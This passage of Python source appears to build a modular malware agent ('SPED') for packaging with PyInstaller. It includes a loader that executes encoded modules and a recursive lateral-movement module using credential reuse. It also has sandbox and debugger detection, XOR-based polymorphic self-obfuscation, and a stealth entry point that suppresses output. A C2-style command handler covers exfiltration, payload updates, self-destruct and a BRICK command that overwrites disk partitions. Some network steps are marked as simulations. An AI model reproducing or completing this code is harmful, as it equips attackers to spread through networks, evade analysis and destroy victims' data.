        module.__dict__.update({
            'shared_context': shared_context, # Inject the entire shared_context module
            'log_internal': shared_context.log_internal, # Specific functions for convenience
            'set_covert_command': shared_context.set_covert_command,
            'add_exfil_data_chunk': shared_context.add_exfil_data_chunk,
            'background_threads': shared_context.background_threads,
            'network_map': shared_context.network_map,
            'subprocess': subprocess, # Allow modules to use subprocess
            'os': os, # Allow modules to use os
            'time': time, # Allow modules to use time
            'queue': queue, # For thread-safe operations in modules
            'threading': threading, # For starting new threads in modules
            'base64': base64, # For encoding/decoding
            'zlib': zlib, # For compression/decompression
            're': re, # For regex operations
            'random': random, # For random operations
            'hashlib': hashlib # For hashing
        })
        
        exec(module_code, module.__dict__) # Execute code within module's dictionary
        loaded_modules[module_name] = module
        shared_context.log_internal(f"ModuleLoad: Successfully loaded module: {module_name}")
        return True
    except (base64.binascii.Error, zlib.error, UnicodeDecodeError) as e:
        shared_context.log_internal(f"ModuleLoad: Decoding/Decompression error for module {module_name}: {e}")
        return False
    except SyntaxError as e:
        shared_context.log_internal(f"ModuleLoad: Syntax error in module {module_name}: {e}")
        return False
    except Exception as e: # Catch any other unexpected errors
        shared_context.log_internal(f"ModuleLoad: Unexpected error loading module {module_name}: {e}")
        shared_context.log_internal(f"ModuleLoad Trace: {traceback.format_exc()}") # Log full traceback
        return False

def unload_module(module_name):
    \"\"\"
    Unloads a dynamically loaded module.
    Calls a 'cleanup' function in the module if it exists.
    \"\"\"
    if module_name in loaded_modules:
        try:
            # Call cleanup function if it exists in the module
            if hasattr(loaded_modules[module_name], 'cleanup') and callable(getattr(loaded_modules[module_name], 'cleanup')):
                getattr(loaded_modules[module_name], 'cleanup')()
            
            # Remove from loaded_modules and sys.modules (important for true unload)
            del loaded_modules[module_name]
            if module_name in sys.modules:
                del sys.modules[module_name]
            shared_context.log_internal(f"ModuleUnload: Successfully unloaded module: {module_name}")
            return True
        except Exception as e:
            shared_context.log_internal(f"ModuleUnload: Error unloading module {module_name}: {e}")
            shared_context.log_internal(f"ModuleUnload Trace: {traceback.format_exc()}")
            return False
    shared_context.log_internal(f"ModuleUnload: Module '{module_name}' not found for unloading.")
    return False

def execute_module_command(module_name, command, *args, **kwargs):
    \"\"\"
    Executes a specific function (command) within a loaded module.
    \"\"\"
    if module_name in loaded_modules:
        module = loaded_modules[module_name]
        if hasattr(module, command) and callable(getattr(module, command)):
            try:
                shared_context.log_internal(f"ModuleExec: Executing command '{command}' in module '{module_name}'.")
                result = getattr(module, command)(*args, **kwargs)
                shared_context.log_internal(f"ModuleExec: Command '{command}' in module '{module_name}' completed.")
                return result
            except Exception as e: # Catch any errors during execution of the module's command
                shared_context.log_internal(f"ModuleExec: Error executing command '{command}' in module '{module_name}': {e}")
                shared_context.log_internal(f"ModuleExec Trace: {traceback.format_exc()}") # Log full traceback
        else:
            shared_context.log_internal(f"ModuleExec: Command '{command}' not found or not callable in module '{module_name}'.")
    else:
       shared_context.log_internal(f"ModuleExec: Module '{module_name}' not loaded.")
    return None
"""

# Recursive Lateral Pivot Sequence (as a modular payload)
# Simulates network reconnaissance, credential reuse, and recursive lateral movement.
LATERAL_MOVEMENT_CODE = """
import re
import subprocess
import time
import os
import threading
import base64
import random
import sys
import shared_context # Import the shared context module

def run_command(target, cmd, creds=None, user=None):
    \"\"\"
    Simulates running an OS command on a remote target.
    In a real scenario, this would involve actual network protocols (SSH, WinRM, etc.).
    \"\"\"
    shared_context.log_internal(f"LateralMove: Attempting remote command '{cmd}' on {target} as {user or 'system'}")
    try:
        # This is a simulation. Replace with actual remote execution logic.
        # Example for Linux: subprocess.run(['ssh', f'{user}@{target}', cmd], capture_output=True, text=True)
        # Example for Windows: subprocess.run(['psexec', f'\\\\{target}', '-u', user, '-p', creds['password'], cmd], capture_output=True, text=True)
        simulated_result = f"SIMULATED_SUCCESS_ON:{target}:{cmd}"
        shared_context.log_internal(f"LateralMove: Simulated command success on {target}")
        return simulated_result
    except Exception as e:
        shared_context.log_internal(f"LateralMove: Remote command failed on {target}: {e}")
        return None

def exploit_new_target(target, user, password, hops=1):
    \"\"\"
    After compromising a target, enumerates neighbors and recursively attempts lateral movement.
    This function is designed to be called as a background task.
    \"\"\"
    shared_context.log_internal(f"LateralMove: Pivoting from compromised node {target} (hop {hops}).")
    try:
        # Simulate command to find neighbors (e.g., ARP table)
        neighbor_cmd = "arp -a" if sys.platform.startswith('win') else "ip neighbor show"
        neighbor_output = run_command(target, neighbor_cmd, creds={'user':user,'password':password}, user=user)
        
        if neighbor_output:
            ips_found = re.findall(r"(?:[0-9]{1,3}\\.){3}[0-9]{1,3}", str(neighbor_output))
            shared_context.log_internal(f"LateralMove: Discovered neighboring IPs: {ips_found} from {target}")
            for ip in ips_found:
                # Avoid self/broadcast addresses and already mapped IPs
                if ip not in shared_context.network_map and ip != "127.0.0.1" and ip != "0.0.0.0":
                    shared_context.network_map[ip] = {'status': 'discovered', 'last_check': int(time.time())}
                    shared_context.log_internal(f"LateralMove: New IP {ip} discovered. Initiating cred reuse.")
                    shared_context.start_background_task(cred_reuse, ip, user, password, hops=hops+1)
        else:
            shared_context.log_internal(f"LateralMove: No neighbor output from {target}.")
        
    except Exception as e:
        shared_context.log_internal(f"LateralMove: Error during lateral movement from {target}: {e}")

def cred_reuse(target, user, password, hops=0):
    \"\"\"
    Attempts credential reuse on a target and registers successful compromise.
    \"\"\"
    shared_context.log_internal(f"LateralMove: Attempting credential reuse on {target} with user {user} (hop {hops}).")
    try:
        # Simulate authentication attempt
        authentication_successful = random.random() < 0.7 # Simulate 70% success rate
        
        if authentication_successful:
            shared_context.log_internal(f"LateralMove: Successfully authenticated to {target} with user {user}.")
            confirmation_cmd_output = run_command(target, "whoami", creds={'user':user, 'password':password}, user=user)
            
            if confirmation_cmd_output:
                os_name = detect_os(target, user, password)
                
                # Update network map with compromise status
                shared_context.network_map[target] = {
                    'user': user,
                    'status': 'compromised',
                    'os': os_name,
                    'hops': hops,
                    'compromise_time': int(time.time())
                }
                shared_context.log_internal(f"COMPROMISED:{target}:{user}:{os_name}:{hops}")
                shared_context.add_exfil_data_chunk(base64.b64encode(f"COMPROMISED:{target}:{user}:{os_name}:{hops}".encode()).decode())
                
                shared_context.log_internal(f"LateralMove: Registered {target} as compromised. Starting exploit_new_target.")
                shared_context.start_background_task(exploit_new_target, target, user, password, hops=hops) # Recurse
            else:
                shared_context.log_internal(f"LateralMove: Authenticated to {target} but no confirmation output.")
        else:
            shared_context.log_internal(f"LateralMove: Credential reuse failed on {target} with user {user}.")
    except Exception as e:
        shared_context.log_internal(f"LateralMove: Error during credential reuse on {target} with user {user}: {e}")

def detect_os(target, user, password):
    \"\"\"Basic OS fingerprinting post-access using a command.\"\"\"
    shared_context.log_internal(f"LateralMove: Detecting OS for {target}.")
    try:
        command_output = run_command(target, "uname -a", creds={'user': user, 'password': password}, user=user)
        output_str = str(command_output).lower()
        if 'linux' in output_str or 'darwin' in output_str:
            return 'linux'
        elif 'windows' in output_str: # This assumes 'uname -a' would somehow reveal Windows too. Needs actual WinRM/psexec command.
            return 'windows'
        return 'unknown'
    except Exception as e:
        shared_context.log_internal(f"LateralMove: OS detection failed for {target}: {e}")
        return 'unknown'

def start_lateral_movement(initial_targets, initial_user, initial_password):
    \"\"\"Initiates the lateral movement sequence on a list of initial targets.\"\"\"
    shared_context.log_internal("LateralMove: Initiating lateral movement sequence.")
    for target in initial_targets:
        shared_context.start_background_task(cred_reuse, target, initial_user, initial_password, hops=0)

def cleanup():
    \"\"\"Optional cleanup for when the module is unloaded.\"\"\"
    shared_context.log_internal("LateralMove: Module cleanup initiated. Stopping active lateral movement threads.")
    # In a real scenario, you'd iterate and terminate specific threads if possible.
    # Python threads don't have a clean stop mechanism without specific design.
    # For now, it's a log.
"""

# Deep Anti-Analysis Layer (as a modular payload)
# Performs multi-vector checks to detect analysis environments (e.g., sandboxes, debuggers).
ANTI_ANALYSIS_CODE = """
import sys
import os
import time
import subprocess
import platform
import random # ADDED for jitter
import shared_context # Import the shared context module

# Helper function for timing measurements
def _measure_execution_time(func, *args, **kwargs):
    start_time = time.perf_counter()
    func(*args, **kwargs)
    end_time = time.perf_counter()
    return end_time - start_time

def perform_anti_analysis_checks():
    \"\"\"Performs multi-vector checks to detect analysis environments.\"\"\"
    shared_context.log_internal("AntiAnalysis: Initiating anti-analysis checks.")
    detected = False

    # 1. Filesystem Artifacts
    if platform.system() == 'Windows':
        suspicious_paths = [r"C:\\sandbox", r"C:\\analyzer", r"C:\\Tools", r"C:\\VMware", r"C:\\Program Files\\VMware", r"C:\\Program Files\\Oracle\\VirtualBox"]
        for path in suspicious_paths:
            if os.path.exists(path):
                shared_context.log_internal(f"AntiAnalysis: Detected suspicious path: {path}")
                detected = True
                break
    elif platform.system() == 'Linux':
        suspicious_files = [
            "/etc/vmware-tools/locations",
            "/usr/sbin/VBoxService",
            "/proc/scsi/scsi", # Often contains VM vendor info
            "/sys/class/dmi/id/product_name", # VM product name
            "/dev/vmmon", "/dev/vboxdrv"
        ]
        for fpath in suspicious_files:
            if os.path.exists(fpath):
                shared_context.log_internal(f"AntiAnalysis: Detected suspicious file/device: {fpath}")
                detected = True
                break

    # 2. Timing-based (detect breakpoints/debuggers) - ENHANCED
    try:
        # Measure a baseline sleep duration
        baseline_sleep_duration = _measure_execution_time(time.sleep, 0.05) # 50ms sleep
        
        # Add a random jitter to the actual sleep to make analysis harder
        jitter = random.uniform(0.01, 0.05) # 10-50ms jitter
        sleep_with_jitter = 0.05 + jitter
        actual_sleep_duration = _measure_execution_time(time.sleep, sleep_with_jitter)

        # A significant deviation (e.g., 5x or 1/5th) could indicate debugging or emulation
        if actual_sleep_duration > (baseline_sleep_duration * 5) or actual_sleep_duration < (baseline_sleep_duration / 5):
            shared_context.log_internal(f"AntiAnalysis: Timing anomaly detected (Baseline: {baseline_sleep_duration:.4f}s, Actual: {actual_sleep_duration:.4f}s). Possible debugger/emulator.")
            detected = True
    except Exception as e:
        shared_context.log_internal(f"AntiAnalysis: Error during timing check: {e}")


    # 3. CPU Info (VM-specific strings)
    if platform.system() == 'Linux' and os.path.exists("/proc/cpuinfo"):
        try:
            with open("/proc/cpuinfo", "r") as f:
                cpuinfo = f.read()
                if "VMware" in cpuinfo or "VirtualBox" in cpuinfo or "QEMU" in cpuinfo or "Microsoft Hv" in cpuinfo:
                    shared_context.log_internal("AntiAnalysis: VM CPU vendor string detected.")
                    detected = True
        except Exception as e:
            shared_context.log_internal(f"AntiAnalysis: Error reading /proc/cpuinfo: {e}")

    # 4. Running Processes (looking for analysis tools)
    analysis_processes = ["wireshark", "procmon", "x64dbg", "ollydbg", "ida", "ghidra", "cuckoo", "sandbox"]
    if platform.system() == 'Windows':
        try:
            output = subprocess.run("tasklist", capture_output=True, text=True, check=False).stdout.lower()
            for p_name in analysis_processes:
                if p_name in output:
                    shared_context.log_internal(f"AntiAnalysis: Detected suspicious process: {p_name}")
                    detected = True
                    break
        except Exception as e:
            shared_context.log_internal(f"AntiAnalysis: Error checking tasklist: {e}")
    elif platform.system() == 'Linux':
        try:
            output = subprocess.run("ps aux", capture_output=True, text=True, check=False).stdout.lower()
            for p_name in analysis_processes:
                if p_name in output:
                    shared_context.log_internal(f"AntiAnalysis: Detected suspicious process: {p_name}")
                    detected = True
                    break
        except Exception as e:
            shared_context.log_internal(f"AntiAnalysis: Error checking ps aux: {e}")

    if detected:
        shared_context.log_internal("AntiAnalysis: Analysis environment detected! Triggering countermeasures.")
        # Implement countermeasures:
        # - Self-destruct (delete files, exit)
        # - Go dormant (sleep for long periods)
        # - Alter behavior (send fake data, loop endlessly)
        # - Corrupt system (lightly or completely, e.g., via bricking module)
        return True
    
    shared_context.log_internal("AntiAnalysis: No analysis environment detected.")
    return False

def cleanup():
    \"\"\"Optional cleanup for when the module is unloaded.\"\"\"
    shared_context.log_internal("AntiAnalysis: Module cleanup initiated.")
"""

# Payload Agent (the core in-memory agent)
# This will be the main entry point for the deployed executable after initial compromise.
PAYLOAD_AGENT_CODE = """
import sys
import time
import threading
import queue
import base64
import zlib
import subprocess
import os
import random
import hashlib
import re
import importlib.util # Needed for dynamic payload execution
import traceback # For detailed exception logging

import shared_context # Import the shared context module

# NullWriter class to suppress stdout/stderr locally within this module's scope
class NullWriter:
    def write(self, s):
        pass

# Redirect stdout and stderr locally within this module's scope if needed
# This ensures that any direct print statements within this module are suppressed.
_original_stdout = sys.stdout
_original_stderr = sys.stderr
sys.stdout = NullWriter()
sys.stderr = NullWriter()

# --- Polymorphic Code Generation ---
# Generates a new, obfuscated version of the agent's code, incorporating entropy.
def quantum_entropy():
    \"\"\"
    Generates cryptographic-grade entropy for polymorphic code generation.
    Prioritizes quantum_forking for randomness, falls back to OS-level entropy.
    \"\"\"
    try:
        # Dynamically import quantum_forking if it's available (bundled by PyInstaller)
        from quantum_forking import quantum_fork_decision_for_seed as get_quantum_seed_val
        quantum_seed = str(get_quantum_seed_val()).encode('utf-8')
    except (ImportError, Exception):
        quantum_seed = b'' # Fallback if quantum_forking is not available or fails
    
    # Combine various entropy sources
    seed_data = os.urandom(256) + bytes(str(time.time()), 'utf-8') + os.getpid().to_bytes(4, 'little') + quantum_seed
    return hashlib.sha256(seed_data).digest()

def generate_polymorphic_payload(template_code):
    \"\"\"
    Takes the agent's code as a template and generates a new polymorphic variant.
    This involves XOR obfuscation with a random key and insertion of junk code.
    \"\"\"
    entropy = quantum_entropy()
    key_bytes = entropy[:16] # Use first 16 bytes of entropy as a 128-bit key
    
    obfuscated_bytes = bytearray()
    template_bytes = template_code.encode('utf-8')
    for i, b in enumerate(template_bytes):
        obfuscated_bytes.append(b ^ (key_bytes[i % len(key_bytes)]))

    # Insert junk code randomly to change the payload's signature
    junk_options = [
        b'# Void of no-operation\\n',
        b'# Data streams flowing\\n',
        b'# Quantum states collapsing\\n',
    ]
    chunk_size = random.randint(50, 200) # Randomize chunk size for junk insertion
    polymorphic_code = bytearray()
    for i in range(0, len(obfuscated_bytes), chunk_size):
        polymorphic_code.extend(obfuscated_bytes[i:i+chunk_size])
        if random.random() < 0.3: # 30% chance to insert junk after each chunk
            polymorphic_code.extend(random.choice(junk_options))

    # Prepare a decoding stub that will be prepended to the obfuscated code.
    # This stub contains the key and logic to de-obfuscate and execute the payload.
    key_b64 = base64.b64encode(key_bytes).decode('utf-8')
    obfuscated_b64 = base64.b64encode(polymorphic_code).decode('utf-8')

    decoder_code = f'''
import base64
import zlib
import sys
import os
import time
import random
import hashlib
import re
import importlib.util

# The shared_context module must be available for this to work correctly
import shared_context

def decode_and_execute_payload():
    \"\"\"
    Decodes and executes the obfuscated polymorphic payload.
    Removes junk code before execution.
    \"\"\"
    encoded_payload = "{obfuscated_b64}"
    key_b64 = "{key_b64}"
    
    key_bytes = base64.b64decode(key_b64)
    obfuscated_bytes = base64.b64decode(encoded_payload)
    
    decoded_bytes = bytearray()
    for i, b in enumerate(obfuscated_bytes):
        decoded_bytes.append(b ^ (key_bytes[i % len(key_bytes)]))
    
    # Remove junk code (lines starting with '# Void', '# Data', '# Quantum')
    decoded_str = decoded_bytes.decode('utf-8')
    clean_code_lines = []
    for line in decoded_str.splitlines():
        if not (line.strip().startswith('# Void') or
                line.strip().startswith('# Data') or
                line.strip().startswith('# Quantum')):
            clean_code_lines.append(line)
    clean_code = "\\n".join(clean_code_lines)

    # Execute the cleaned code in a new module scope
    module_name = "polymorphic_payload_exec"
    spec = importlib.util.spec_from_loader(module_name, loader=None)
    module = importlib.util.module_from_spec(spec)
    
    # Inject shared context and common modules into the dynamically executed payload's global scope.
    module.__dict__.update({
        'shared_context': shared_context, # Inject the entire shared_context module
        'log_internal': shared_context.log_internal, # Specific functions for convenience
        'set_covert_command': shared_context.set_covert_command,
        'add_exfil_data_chunk': shared_context.add_exfil_data_chunk,
        'background_threads': shared_context.background_threads,
        'network_map': shared_context.network_map,
        'current_polymorphic_payload_code': shared_context.current_polymorphic_payload_code, # Use shared global
        'subprocess': subprocess,
        'os': os,
        'time': time,
        'queue': queue,
        'threading': threading,
        'base64': base64,
        'zlib': zlib,
        're': re,
        'random': random,
        'hashlib': hashlib,
        'importlib': importlib # Allow dynamic imports within the payload
    })
    
    exec(clean_code, module.__dict__)
    sys.modules[module_name] = module # Make it importable by others if needed
    return module

if __name__ == '__main__':
    # This block will only run if the generated payload is executed directly
    # For the SPED agent, this will be called via exec()
    decoded_module = decode_and_execute_payload()
    shared_context.log_internal("Polymorphic payload decoded and executed.")
    # You can now call functions from decoded_module if it exposed any
    # e.g., if decoded_module had a 'run_task' function:
    # decoded_module.run_task()
'''
    return decoder_code

# --- SPED Agent Core Logic ---
class SPEDAgent:
    \"\"\"
    The main SPED Agent class, orchestrating all modules and functionalities.
    \"\"\"
    def __init__(self):
        shared_context.log_internal("SPEDAgent: Initializing...")
        self.narrative = None
        self.emotional_feedback = None
        self.modular_loader = None
        self.quantum_forking = None
        self.agent_active = True
        self.last_exfil_time = time.time()
        self.exfil_interval = 10 # seconds between exfiltration attempts

        # Store the initial payload code for polymorphic regeneration.
        # This agent's own code serves as the template for future updates.
        shared_context.current_polymorphic_payload_code = PAYLOAD_AGENT_CODE

        self._load_initial_modules()

    def _load_initial_modules(self):
        \"\"\"
        Loads the core modules required for the agent's basic operation.
        These modules are expected to be bundled with the executable.
        \"\"\"
        shared_context.log_internal("SPEDAgent: Loading initial core modules...")
        try:
            import modular_loader as ml
            self.modular_loader = ml
            shared_context.log_internal("SPEDAgent: modular_loader loaded.")

            import sped_narrative
            self.narrative = sped_narrative.SPEDNarrative("The journey begins in silence.")
            shared_context.log_internal("SPEDAgent: sped_narrative loaded.")

            import emotional_feedback
            self.emotional_feedback = emotional_feedback
            shared_context.log_internal("SPEDAgent: emotional_feedback loaded.")

            import quantum_forking
            self.quantum_forking = quantum_forking
            shared_context.log_internal("SPEDAgent: quantum_forking loaded.")

        except ImportError as e:
            shared_context.log_internal(f"SPEDAgent: Critical module import failed: {e}")
            shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")
            self.agent_active = False # Agent cannot function without core modules
        except Exception as e:
            shared_context.log_internal(f"SPEDAgent: Error during initial module loading: {e}")
            shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")
            self.agent_active = False

    def run_main_loop(self):
        \"\"\"
        The main operational loop of the SPED Agent.
        Handles command processing, narrative adaptation, exfiltration, and internal decisions.
        \"\"\"
        shared_context.log_internal("SPEDAgent: Entering main loop.")
        while self.agent_active:
            # 1. Check for covert commands from C2 or internal triggers
            command = shared_context.get_covert_command()
            if command:
                shared_context.log_internal(f"SPEDAgent: Covert command received: {command}")
                self.handle_command(command)

            # 2. Simulate user interaction / environmental input
            # In a real agent, this would be passive monitoring. For demo, we simulate input.
            user_input = None
            if random.random() < 0.3: # Simulate occasional user input
                user_input = random.choice(["I feel good today.", "This is frustrating.", "What's next?", "I'm neutral."])
            else:
                user_input = "" # No input this cycle
            
            if user_input and user_input.lower() == 'exit':
                self.agent_active = False
                shared_context.log_internal("SPEDAgent: Exit command received.")
                break

            # 3. Process input and adapt narrative
            if user_input:
                emotion = self.emotional_feedback.analyze_emotion(user_input)
                shared_context.log_internal(f"SPEDAgent: User input '{user_input}' analyzed as '{emotion}'.")
                narrative_response = self.narrative.adapt_narrative(emotion) # Pass emotion to narrative
                
                # Check narrative response for embedded commands/exfil data
                self._extract_embedded_from_text(narrative_response)
                
                shared_context.log_internal(f"SPEDAgent: Narrative updated. Response: {narrative_response}")

            # 4. Perform periodic exfiltration of accumulated logs/data
            if time.time() - self.last_exfil_time >= self.exfil_interval:
                self.exfil_data()
                self.last_exfil_time = time.time()

            # 5. Quantum Forking Decision (simulate agent's internal decision-making)
            if self.quantum_forking:
                decision = self.quantum_forking.quantum_fork_decision()
                shared_context.log_internal(f"SPEDAgent: Quantum fork decision: {decision}")
                # Agent's behavior might alter based on this decision (e.g., escalate, maintain stealth)
                if decision == "branch1":
                    shared_context.log_internal("SPEDAgent: Following Branch 1 (e.g., maintain stealth).")
                else:
                    shared_context.log_internal("SPEDAgent: Following Branch 2 (e.g., escalate privilege attempt).")
                    # In a real scenario, this might trigger loading a specific modular payload.

            time.sleep(1) # Agent sleeps for a bit to prevent busy-looping and conserve resources

    def _extract_embedded_from_text(self, text):
        \"\"\"
        Parses text (e.g., narrative responses, incoming data) for embedded covert commands and data chunks.
        \"\"\"
        # Extract covert commands (e.g., [cmd:BASE64_ENCODED_CMD])
        cmd_matches = re.findall(r'\\[cmd:([a-zA-Z0-9+/=]+)\\]', text)
        for encoded_cmd in cmd_matches:
            try:
                decoded_cmd = self.emotional_feedback.decode_covert_message(encoded_cmd)
                if decoded_cmd.startswith("CMD:"):
                    actual_command = decoded_cmd[4:]
                    shared_context.set_covert_command(actual_command) # Add to command queue
                    shared_context.log_internal(f"SPEDAgent: Extracted covert command: {actual_command}")
            except Exception as e:
                shared_context.log_internal(f"SPEDAgent: Error decoding embedded command: {e}")
                shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")

        # Extract exfil data chunks (e.g., [data_chunk_X:BASE64_ENCODED_DATA])
        data_matches = re.findall(r'\\[data_chunk_\\d+:([a-zA-Z0-9+/=]+)\\]', text)
        for encoded_data in data_matches:
            try:
                # The decoder expects the full format, so re-add a dummy prefix
                decoded_data = self.emotional_feedback.decode_data_chunk(f"[data_chunk_0:{encoded_data}]")
                if decoded_data:
                    shared_context.add_exfil_data_chunk(decoded_data) # Add to exfil buffer
                    shared_context.log_internal(f"SPEDAgent: Extracted exfil data chunk.")
            except Exception as e:
                shared_context.log_internal(f"SPEDAgent: Error decoding embedded data chunk: {e}")
                shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")

    def handle_command(self, command):
        \"\"\"
        Processes and executes received commands from C2 or internal triggers.
        \"\"\"
        shared_context.log_internal(f"SPEDAgent: Handling command: {command}")
        parts = command.split(' ', 1)
        cmd_type = parts[0].upper()
        cmd_args = parts[1] if len(parts) > 1 else ""

        if cmd_type == "LOAD_MODULE":
            # Command format: LOAD_MODULE module_name:encoded_code_b64_zlib
            module_name, encoded_code_b64_zlib = cmd_args.split(':', 1)
            if self.modular_loader:
                success = self.modular_loader.load_module_from_code(module_name, encoded_code_b64_zlib)
                shared_context.log_internal(f"SPEDAgent: Load module '{module_name}' {'succeeded' if success else 'failed'}.")
                
                # Trigger specific actions upon loading certain modules
                if module_name == "lateral_movement" and success:
                    if hasattr(self.modular_loader.loaded_modules['lateral_movement'], 'start_lateral_movement'):
                        # Simulate initial targets, user, password for lateral movement
                        shared_context.start_background_task(
                            self.modular_loader.loaded_modules['lateral_movement'].start_lateral_movement,
                            ['192.168.1.100', '192.168.1.101'], 'admin', 'password123'
                        )
                        shared_context.log_internal("SPEDAgent: Started lateral movement.")
                elif module_name == "anti_analysis" and success:
                    if hasattr(self.modular_loader.loaded_modules['anti_analysis'], 'perform_anti_analysis_checks'):
                        shared_context.start_background_task(self.modular_loader.loaded_modules['anti_analysis'].perform_anti_analysis_checks)
                        shared_context.log_internal("SPEDAgent: Started anti-analysis checks.")
                elif module_name == "bricking_module" and success:
                    shared_context.log_internal("SPEDAgent: Bricking module loaded, awaiting specific BRICK command.")
            else:
                shared_context.log_internal("SPEDAgent: Modular loader not available.")
        
        elif cmd_type == "UNLOAD_MODULE":
            # Command format: UNLOAD_MODULE module_name
            module_name = cmd_args
            if self.modular_loader:
                success = self.modular_loader.unload_module(module_name)
                shared_context.log_internal(f"SPEDAgent: Unload module '{module_name}' {'succeeded' if success else 'failed'}.")
            else:
                shared_context.log_internal("SPEDAgent: Modular loader not available.")

        elif cmd_type == "EXECUTE_MODULE_CMD":
            # Command format: EXECUTE_MODULE_CMD module_name:command_name [arg1 arg2 ...]
            module_name, command_args = cmd_args.split(':', 1)
            command_name, *args = command_args.split(' ')
            if self.modular_loader:
                result = self.modular_loader.execute_module_command(module_name, command_name, *args)
                shared_context.log_internal(f"SPEDAgent: Executed module command '{command_name}' in '{module_name}'. Result: {result}")
            else:
                shared_context.log_internal("SPEDAgent: Modular loader not available.")

        elif cmd_type == "EXFIL_DATA_NOW":
            # Command to force immediate data exfiltration
            self.exfil_data()
            shared_context.log_internal("SPEDAgent: Forced data exfiltration.")

        elif cmd_type == "UPDATE_PAYLOAD":
            # Command to update the agent's own code polymorphically
            # Command format: UPDATE_PAYLOAD base64_encoded_new_template_code
            new_template_code = base64.b64decode(cmd_args).decode('utf-8')
            self.update_payload(new_template_code)
            shared_context.log_internal("SPEDAgent: Payload update initiated.")
        
        elif cmd_type == "SELF_DESTRUCT":
            # Command to initiate self-destruction sequence
            self.self_destruct()
            shared_context.log_internal("SPEDAgent: Self-destruct initiated.")
        
        elif cmd_type == "BRICK":
            # Command to use the bricking module (e.g., BRICK /dev/sda1)
            if self.modular_loader and "bricking_module" in self.modular_loader.loaded_modules:
                device_path = cmd_args
                shared_context.log_internal(f"SPEDAgent: Initiating bricking of {device_path}.")
                # Run bricking in a background thread to avoid blocking main loop
                shared_context.start_background_task(
                    self.modular_loader.loaded_modules['bricking_module'].overwrite_partition,
                    device_path
                )
            else:
                shared_context.log_internal("SPEDAgent: Bricking module not loaded or modular loader unavailable.")
        else:
            shared_context.log_internal(f"SPEDAgent: Unknown command: {command}")

    def exfil_data(self):
        \"\"\"
        Retrieves accumulated data from the shared exfil buffer and simulates exfiltration.
        In a real scenario, this would send data to a C2 server over a network.
        For simulation, it prints with special markers for easy parsing.
        \"\"\"
        data = shared_context.retrieve_exfil_data()
        if data:
            # Print with unique markers to easily extract from subprocess stdout
            shared_context.log_internal(f"EXFILTRATED_DATA_START\\n{data}\\nEXFILTRATED_DATA_END")
        else:
            shared_context.log_internal("SPEDAgent: No data to exfiltrate.")

    def update_payload(self, new_template_code):
        \"\"\"
        Generates a new polymorphic version of the agent's code and updates the current payload.
        \"\"\"
        try:
            # Generate the new polymorphic version of the payload
            new_polymorphic_code = generate_polymorphic_payload(new_template_code)
            
            # Update the shared global variable that holds the current payload code.
            # In a real self-modifying agent, this would involve replacing the running process.
            shared_context.current_polymorphic_payload_code = new_polymorphic_code
            shared_context.log_internal("SPEDAgent: Polymorphic payload generated and ready for restart/deployment.")
            shared_context.add_exfil_data_chunk(base64.b64encode(b"PAYLOAD_UPDATED").decode())
        except Exception as e:
            shared_context.log_internal(f"SPEDAgent: Error updating payload: {e}")
            shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")

    def self_destruct(self):
        \"\"\"
        Initiates the self-destruction sequence, stopping the agent and attempting to delete its files.
        \"\"\"
        shared_context.log_internal("SPEDAgent: Initiating self-destruct sequence.")
        self.agent_active = False # Stop main loop
        
        # Attempt to gracefully terminate background threads with a timeout
        for thread in shared_context.background_threads:
            if thread.is_alive():
                shared_context.log_internal(f"SPEDAgent: Attempting to join background thread {thread.name}.")
                try:
                    thread.join(timeout=1.0) # Give thread 1 second to finish
                except RuntimeError: # Occurs if thread was not started or already exited
                    pass
                except Exception as e:
                    shared_context.log_internal(f"SPEDAgent: Error joining thread {thread.name}: {e}")
                    shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")
        
        # Simulate deletion of agent executable file
        try:
            exe_path = sys.argv[0] # Path to the running executable
            if os.path.exists(exe_path):
                # os.remove(exe_path) # Uncomment for actual self-deletion in a real scenario
                shared_context.log_internal(f"SPEDAgent: Simulated deletion of agent executable: {exe_path}")
            else:
                shared_context.log_internal(f"SPEDAgent: Agent executable path not found for deletion: {exe_path}")
        except Exception as e:
            shared_context.log_internal(f"SPEDAgent: Error during self-deletion: {e}")
            shared_context.log_internal(f"SPEDAgent Trace: {traceback.format_exc()}")
        
        # Exit the process
        sys.exit(0)

def main():
    \"\"\"
    Main entry point for the SPED Agent executable.
    Initializes the agent and starts its main operational loop in a background thread.
    \"\"\"
    # Initialize agent instance
    agent = SPEDAgent()
    
    # Start the main operational loop in a background daemon thread.
    # This allows the main process to remain responsive or exit cleanly if needed.
    shared_context.start_background_task(agent.run_main_loop)

    # The actual interaction and command injection will be simulated externally
    # in the Colab script's PHASE 4.
    pass

# Restore original stdout/stderr after the module is defined, before main execution
sys.stdout = _original_stdout
sys.stderr = _original_stderr
"""

# main_entry.py
# The primary script targeted by PyInstaller. It sets up stealth and launches the Payload Agent.
MAIN_ENTRY_SCRIPT_CODE = """
import sys
import os
import time
import threading
import queue

# NullWriter class to suppress stdout/stderr
class NullWriter:
    def write(self, s):
        pass

# Redirect stdout and stderr to NullWriter for stealth
# This ensures that the compiled executable does not produce any visible console output.
_original_stdout = sys.stdout
_original_stderr = sys.stderr
sys.stdout = NullWriter()
sys.stderr = NullWriter()

# Import the main payload agent, which contains the core logic
import payload_agent

if __name__ == '__main__':
    # Call the main function of the payload agent
    payload_agent.main()
    
    # Keep the main process alive for a reasonable duration to allow background
    # threads (like the agent's main loop) to run and produce logs/exfil data.
    # In a real agent, this loop would be indefinite, keeping the process alive.
    try:
        # Give the agent some time to initialize and run a few cycles
        time.sleep(5) 
        
        # Continue sleeping indefinitely to keep the daemon threads alive
        while True:
            time.sleep(60) # Sleep for a minute, then check again
    except KeyboardInterrupt:
        # Allow graceful exit in case of manual termination (e.g., Ctrl+C in terminal)
        pass
    finally:
        # Restore stdout/stderr before exiting for any final output/errors (for debugging)
        sys.stdout = _original_stdout
        sys.stderr = _original_stderr
        # print("SPED Agent process exiting.") # Uncomment for debugging the exit
"""

# Dictionary of all modules that will be written to files for PyInstaller
MODULES = {
    "quantum_forking.py": QUANTUM_FORKING_CODE,
    "emotional_feedback.py": EMOTIONAL_FEEDBACK_CODE,
    "sped_narrative.py": SPED_NARRATIVE_CODE,
    "shared_context.py": SHARED_CONTEXT_CODE,
